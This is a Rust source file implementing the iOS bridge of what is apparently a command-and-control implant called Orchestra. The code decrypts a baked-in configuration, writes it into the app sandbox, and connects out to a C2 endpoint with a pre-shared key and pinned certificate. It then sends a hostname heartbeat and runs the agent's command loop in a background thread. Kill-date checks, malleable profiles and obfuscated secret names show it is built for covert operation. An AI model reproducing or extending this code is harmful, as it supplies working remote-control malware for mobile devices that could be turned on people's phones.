//! iOS C bridge — exports the extern "C" entry points that the Orchestra
//! Xcode project links against via `OrchestraBridge.h`.
//!
//! This module is the Rust-side counterpart to `mobile/ios/OrchestraBridge/OrchestraBridge.c`.
//! The C file declares weak symbols; the strong definitions here replace them
//! when the Rust static library (`libagent.a`) is linked.
//!
//! All four functions match the signatures declared in `OrchestraBridge.h`:
//!   - `orchestra_init(config_ptr, config_len) -> i32`
//!   - `orchestra_start() -> i32`
//!   - `orchestra_stop()`
//!   - `orchestra_is_running() -> i32`
//!
//! # Architecture
//!
//! When built with the `outbound-c` feature (the default for mobile deployments),
//! the bridge uses the standard `outbound::run_forever()` path — the same
//! outbound connection loop as all other targets.  The encrypted config
//! received via `orchestra_init()` is written to a temp location and injected
//! via `ORCHESTRA_CONFIG` so `config::load_config()` picks it up.
//!
//! The build-time env vars (`SYS_C_ADDR`, `SYS_C_SECRET`, `SYS_C_CERT_FP`)
//! must be baked in by the Builder, exactly as they are for any other target.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, OnceLock};

/// Global agent state — initialised once by `orchestra_init`.
struct IosAgentState {
    encrypted_config: Vec<u8>,
    running: bool,
}

static AGENT_STATE: OnceLock<Arc<Mutex<IosAgentState>>> = OnceLock::new();
static AGENT_STARTED: AtomicBool = AtomicBool::new(false);

/// Initialise the agent with an encrypted configuration blob.
///
/// # Arguments
/// * `config_ptr` - Pointer to the encrypted config bytes.
/// * `config_len` - Number of bytes in the config blob.
///
/// # Returns
/// 0 on success, -1 on failure.
#[no_mangle]
pub extern "C" fn orchestra_init(config_ptr: *const u8, config_len: usize) -> i32 {
    let result: Result<(), String> = (|| {
        if config_ptr.is_null() || config_len == 0 {
            return Err("config_ptr is null or config_len is 0".to_string());
        }
        let slice = unsafe { std::slice::from_raw_parts(config_ptr, config_len) };
        let state = IosAgentState {
            encrypted_config: slice.to_vec(),
            running: false,
        };
        AGENT_STATE
            .set(Arc::new(Mutex::new(state)))
            .map_err(|_| "Agent already initialised".to_string())?;
        Ok(())
    })();

    match result {
        Ok(()) => {
            tracing::info!(
                "orchestra_init: config received ({} bytes)",
                AGENT_STATE
                    .get()
                    .map(|s| s.lock().unwrap().encrypted_config.len())
                    .unwrap_or(0)
            );
            0
        }
        Err(e) => {
            tracing::error!("orchestra_init failed: {e}");
            -1
        }
    }
}

/// Start the agent's main command loop on a background thread.
///
/// # Returns
/// 0 on success, -1 if not initialised or already running.
#[no_mangle]
pub extern "C" fn orchestra_start() -> i32 {
    let state_arc = match AGENT_STATE.get() {
        Some(s) => s.clone(),
        None => {
            tracing::error!("orchestra_start: agent not initialised (call orchestra_init first)");
            return -1;
        }
    };

    {
        let mut state = state_arc.lock().unwrap();
        if state.running {
            tracing::warn!("orchestra_start: agent is already running");
            return 0;
        }
        state.running = true;
    }

    AGENT_STARTED.store(true, Ordering::SeqCst);

    // Spawn the agent loop on a background thread so this call returns
    // immediately (the Swift/ObjC caller should not block).
    std::thread::spawn(move || {
        let result =
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| run_agent_loop(state_arc)));

        match result {
            Ok(inner) => {
                if let Err(e) = inner {
                    tracing::error!("orchestra_start: agent loop error: {e}");
                }
            }
            Err(panic_payload) => {
                let msg = if let Some(s) = panic_payload.downcast_ref::<&str>() {
                    *s
                } else if let Some(s) = panic_payload.downcast_ref::<String>() {
                    s.as_str()
                } else {
                    "unknown panic"
                };
                tracing::error!("orchestra_start: agent thread panicked: {msg}");
            }
        }
    });

    tracing::info!("orchestra_start: agent thread spawned");
    0
}

/// Signal the agent to perform a graceful shutdown.
#[no_mangle]
pub extern "C" fn orchestra_stop() {
    tracing::info!("orchestra_stop: signalling agent shutdown");
    AGENT_STARTED.store(false, Ordering::SeqCst);
    crate::handlers::SHUTDOWN_NOTIFY.notify_waiters();
}

/// Check if the agent is currently running.
///
/// # Returns
/// 1 if running, 0 otherwise.
#[no_mangle]
pub extern "C" fn orchestra_is_running() -> i32 {
    if AGENT_STARTED.load(Ordering::SeqCst) {
        1
    } else {
        0
    }
}

/// The agent loop — adapted for the iOS C bridge context.
///
/// On iOS the agent runs in-process as a background thread.  The tokio runtime
/// is created here because the calling thread is a raw pthread (not a tokio
/// task).  The encrypted config is decrypted and written to a temp location
/// so `config::load_config()` picks it up.
///
/// Two paths:
/// 1. **outbound-c enabled** (production): uses `outbound::run_forever()` —
///    the same reconnect loop as all other targets.  The C2 address and PSK
///    come from build-time env vars baked in by the Builder.
/// 2. **outbound-c disabled** (debug/testing): uses `outbound::build_outbound_transport()`
///    with the endpoint from the decrypted config and the PSK from env.
fn run_agent_loop(
    state: Arc<Mutex<IosAgentState>>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    tracing::info!("Agent loop starting via iOS C bridge...");

    // Create a single-threaded tokio runtime.  iOS doesn't need a full
    // multi-threaded scheduler; one worker thread + the async C2 loop is
    // sufficient and keeps binary size small.
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    rt.block_on(async move {
        // Decrypt the config using the baked-in module key.
        let crypto_key = {
            let baked = option_env!("SYS_MODULE_KEY");
            if let Some(b64) = baked {
                use base64::Engine;
                match base64::engine::general_purpose::STANDARD.decode(b64) {
                    Ok(bytes) if bytes.len() == 32 => {
                        let mut key = [0u8; 32];
                        key.copy_from_slice(&bytes);
                        key
                    }
                    _ => {
                        tracing::error!(
                            "orchestra_start: SYS_MODULE_KEY is malformed; cannot decrypt config"
                        );
                        return;
                    }
                }
            } else {
                tracing::error!(
                    "orchestra_start: SYS_MODULE_KEY not baked in; cannot decrypt config. \
                     Rebuild through the Builder."
                );
                return;
            }
        };

        let crypto = Arc::new(common::CryptoSession::from_key(crypto_key));
        crate::memory_guard::register_session_key(&crypto);

        // Decrypt the config blob.
        let config_bytes = {
            let guard = state.lock().unwrap();
            guard.encrypted_config.clone()
        };
        let config_plaintext = match crypto.decrypt(&config_bytes).await {
            Ok(p) => p,
            Err(e) => {
                tracing::error!("orchestra_start: failed to decrypt config: {e}");
                return;
            }
        };

        // Write the decrypted config to the path that config::load_config()
        // reads from (~/.config/sysd/agent.toml).  On iOS the app sandbox
        // home directory is writable, but ~/.config/sysd/ may not exist yet.
        let config_path = crate::config::config_path();
        if let Some(parent) = config_path.parent() {
            if let Err(e) = std::fs::create_dir_all(parent) {
                tracing::error!("orchestra_start: failed to create config dir {}: {e}", parent.display());
                return;
            }
        }
        if let Err(e) = std::fs::write(&config_path, &config_plaintext) {
            tracing::error!("orchestra_start: failed to write decrypted config to {}: {e}", config_path.display());
            return;
        }

        tracing::info!(
            "orchestra_start: decrypted config written to {} ({} bytes)",
            config_path.display(),
            config_plaintext.len()
        );

        // ── Transport construction ─────────────────────────────────────────
        // When outbound-c is enabled, delegate to the standard outbound loop.
        // This handles mTLS, cert pinning, transport selection, reconnection,
        // and the full VersionHandshake → Heartbeat → Agent::run() flow.
        #[cfg(feature = "outbound-c")]
        {
            // Install the ring CryptoProvider so rustls can perform TLS.
            let _ = rustls::crypto::ring::default_provider().install_default();

            match crate::outbound::run_forever().await {
                Ok(()) => {
                    tracing::info!("orchestra_start: outbound::run_forever() exited cleanly");
                }
                Err(e) => {
                    tracing::error!("orchestra_start: outbound::run_forever() error: {e:#}");
                }
            }
            return;
        }

        // ── Fallback (no outbound-c feature) ───────────────────────────────
        // Without the outbound-c feature, build a direct TLS transport to
        // the C2 endpoint specified in the config.
        #[cfg(not(feature = "outbound-c"))]
        {
            let cfg = match crate::config::load_config() {
                Ok(c) => c,
                Err(e) => {
                    tracing::error!("orchestra_start: failed to load config: {e}");
                    return;
                }
            };

            // Kill-date check.
            if !cfg.malleable_profile.kill_date.is_empty() {
                if let Err(e) = crate::config::check_kill_date(&cfg.malleable_profile.kill_date) {
                    tracing::error!("orchestra_start: kill date reached: {e}");
                    return;
                }
            }

            // Resolve the C2 address from the config.
            let endpoint = if !cfg.malleable_profile.direct_c2_endpoint.is_empty() {
                cfg.malleable_profile.direct_c2_endpoint.clone()
            } else {
                tracing::error!(
                    "orchestra_start: no direct_c2_endpoint in config and outbound-c not compiled in"
                );
                return;
            };

            // Resolve the PSK — same logic as outbound::resolve_secret().
            let secret = {
                let raw = string_crypt::enc_str!("SYS_SECRET");
                let key = std::str::from_utf8(&raw)
                    .unwrap_or("SYS_SECRET")
                    .trim_end_matches('\0');
                std::env::var(key).ok().or_else(|| {
                    option_env!("SYS_C_SECRET").map(str::to_string)
                })
            };

            let secret = match secret {
                Some(s) => s,
                None => {
                    tracing::error!(
                        "orchestra_start: no PSK configured (SYS_SECRET or SYS_C_SECRET)"
                    );
                    return;
                }
            };

            let cert_fp: Option<&str> = option_env!("SYS_C_CERT_FP");

            let agent_id = cfg.agent_id.clone().unwrap_or_else(|| {
                uuid::Uuid::new_v4().to_string()
            });

            // Build transport using the same function as outbound-c.
            let transport = match crate::outbound::build_outbound_transport(
                &endpoint,
                &secret,
                cert_fp,
                &agent_id,
                None, // mesh_public_key — not needed for iOS (no P2P)
            )
            .await
            {
                Ok(t) => t,
                Err(e) => {
                    tracing::error!("orchestra_start: failed to build outbound transport: {e:#}");
                    return;
                }
            };

            // Send initial heartbeat.
            let hostname = sysinfo::System::host_name().unwrap_or_else(|| "unknown".to_string());
            if let Err(e) = transport
                .send(common::Message::Heartbeat {
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .map(|d| d.as_secs())
                        .unwrap_or(0),
                    agent_id: agent_id.clone(),
                    status: hostname,
                    mesh_public_key: None,
                })
                .await
            {
                tracing::error!("orchestra_start: failed to send heartbeat: {e}");
                return;
            }

            let mesh_private_key = {
                use common::LockedSecret;
                let mut secret = LockedSecret::new([0u8; 32]);
                let _ = getrandom::getrandom(secret.as_mut());
                Arc::new(secret)
            };

            let mut agent = match crate::Agent::new(
                transport,
                agent_id,
                mesh_private_key,
                [0u8; 32], // ephemeral mesh key — iOS doesn't use P2P
            ) {
                Ok(a) => a,
                Err(e) => {
                    tracing::error!("orchestra_start: failed to construct Agent: {e}");
                    return;
                }
            };

            if let Err(e) = agent.run().await {
                tracing::error!("orchestra_start: Agent::run() returned error: {e}");
                return;
            }

            tracing::info!("orchestra_start: Agent::run() exited cleanly");
        }
    });

    Ok(())
}
